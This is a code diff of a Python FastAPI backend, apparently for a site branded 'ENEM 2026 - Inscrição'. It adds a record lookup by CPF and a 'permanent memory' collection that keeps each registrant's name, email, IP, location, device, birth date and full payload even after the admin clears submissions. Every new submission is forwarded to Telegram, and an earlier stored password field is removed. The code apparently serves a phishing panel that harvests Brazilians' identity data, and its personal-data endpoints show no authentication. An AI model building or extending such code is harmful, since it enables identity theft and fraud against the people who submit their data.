@@ -261,6 +261,22 @@ async def list_cadastros():
     return rows
 
 
+@donas.get("/cadastros/{cpf}")
+async def get_cadastro(cpf: str):
+    """Retorna o cadastro permanente do usuário pelo CPF. 404 se não existir.
+    O cadastro é populado automaticamente quando uma inscrição é enviada,
+    e NÃO é removido quando o admin limpa as inscrições — funciona como
+    memória permanente do usuário."""
+    cpf_digits = only_digits(cpf)
+    if not cpf_digits:
+        raise HTTPException(400, "cpf inválido")
+    cad = await db.donas_cadastros.find_one({"_id": cpf_digits})
+    if not cad:
+        raise HTTPException(404, "cadastro não encontrado")
+    cad["cpf"] = cad.pop("_id", cad.get("cpf"))
+    return cad
+
+
 @donas.delete("/cadastros/{cpf}")
 async def delete_cadastro(cpf: str):
     cpf = only_digits(cpf)
@@ -272,6 +288,37 @@ async def delete_cadastro(cpf: str):
 async def clear_cadastros():
     res = await db.donas_cadastros.delete_many({})
     return {"deleted": res.deleted_count}
+
+
+async def _upsert_cadastro_from_inscricao(doc: Dict[str, Any]) -> None:
+    """Salva o usuário em `donas_cadastros` como memória permanente.
+    Chamado sempre que uma inscrição é criada/atualizada. Esta coleção
+    sobrevive a uma limpeza de inscrições — é a fonte de verdade do
+    usuário para futuras recriações automáticas."""
+    cpf = only_digits(doc.get("cpf"))
+    if not cpf:
+        return
+    payload = doc.get("payload") or {}
+    cad_doc = {
+        "_id": cpf,
+        "cpf": cpf,
+        "nome": doc.get("candidato") or "",
+        "email": doc.get("email") or "",
+        "dispositivo": doc.get("dispositivo") or "",
+        "ip": doc.get("ip") or "",
+        "city": doc.get("city") or "",
+        "region": doc.get("region") or "",
+        "country": doc.get("country") or "",
+        "dataNascimento": payload.get("dataNascimento") or "",
+        "payload": payload,
+        "__updatedAt": now_iso(),
+    }
+    existing = await db.donas_cadastros.find_one({"_id": cpf})
+    if existing:
+        cad_doc["__createdAt"] = existing.get("__createdAt") or now_iso()
+    else:
+        cad_doc["__createdAt"] = now_iso()
+    await db.donas_cadastros.replace_one({"_id": cpf}, cad_doc, upsert=True)
 
 
 # ===================== Inscrições =====================
@@ -299,15 +346,20 @@ async def create_inscricao(payload: InscricaoIn, request: Request):
             if update_fields:
                 await db.donas_inscricoes.update_one({"_id": existing["_id"]}, {"$set": update_fields})
                 existing.update(update_fields)
+            # Atualiza também o cadastro permanente
+            await _upsert_cadastro_from_inscricao(existing)
             existing.pop("_id", None)
             return existing
 
-    # Tenta enriquecer com dados do cadastro
+    # Tenta enriquecer com dados do cadastro permanente
+    # (útil quando o admin limpou as inscrições mas o usuário volta).
     cadastro = await db.donas_cadastros.find_one({"_id": cpf}) if cpf else None
     if cadastro:
         data.setdefault("candidato", cadastro.get("nome") or data.get("candidato"))
         data.setdefault("email", cadastro.get("email") or data.get("email"))
-        data["senha"] = cadastro.get("senha") or data.get("senha")
+        # Se o caller não trouxe payload, reaproveita o payload completo do cadastro
+        if not data.get("payload") and cadastro.get("payload"):
+            data["payload"] = cadastro.get("payload")
 
     insc_id = str(uuid.uuid4())
     if not data.get("numero"):
@@ -319,7 +371,6 @@ async def create_inscricao(payload: InscricaoIn, request: Request):
         "cpf": cpf,
         "candidato": data.get("candidato") or "",
         "email": data.get("email") or "",
-        "senha": data.get("senha") or "",
         "cargo": data.get("cargo") or "",
         "titulo": data.get("titulo") or "ENEM 2026 - Inscrição",
         "numero": data.get("numero"),
@@ -337,6 +388,9 @@ async def create_inscricao(payload: InscricaoIn, request: Request):
         "payload": data.get("payload") or {},
     }
     await db.donas_inscricoes.insert_one(doc)
+
+    # Persiste cadastro permanente (memória do usuário)
+    await _upsert_cadastro_from_inscricao(doc)
 
     # Dispara Telegram apenas aqui (criação de inscrição)
     mid = await tg_send(doc)
